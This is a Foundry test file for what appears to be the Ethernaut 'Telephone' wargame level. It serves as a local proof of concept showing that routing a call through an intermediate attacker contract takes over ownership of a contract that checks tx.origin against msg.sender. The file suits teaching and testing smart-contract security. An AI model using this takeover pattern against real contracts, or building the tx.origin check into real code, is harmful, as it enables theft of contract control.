// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Telephone} from "../src/04-Telephone.sol";
import {TelephoneAttack} from "../src/attackers/TelephoneAttack.sol";

contract TelephoneTest is Test {
    Telephone public telephone;
    TelephoneAttack public attackerContract;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(deployer);
        telephone = new Telephone();

        // Deploy the attack contract
        attackerContract = new TelephoneAttack(address(telephone));
    }

    function test_InitialOwner() public view {
        assertEq(telephone.owner(), deployer);
    }

    function test_DirectCallFailsToChangeOwner() public {
        // When an EOA calls changeOwner directly, tx.origin == msg.sender == attacker
        vm.prank(attacker, attacker); // (msg.sender, tx.origin)
        telephone.changeOwner(attacker);

        // Owner remains the deployer!
        assertEq(telephone.owner(), deployer);
        assertNotEq(telephone.owner(), attacker);
    }

    function test_AttackViaIntermediateContractSucceeds() public {
        // Attacker EOA initiates the transaction
        // tx.origin = attacker, but Telephone sees msg.sender = address(attackerContract)
        vm.prank(attacker, attacker); // (msg.sender, tx.origin)
        attackerContract.attack(attacker);

        // Verification: Attacker is now the owner!
        assertEq(telephone.owner(), attacker);
        console2.log("Local PoC Success: New owner is", telephone.owner());
    }
}
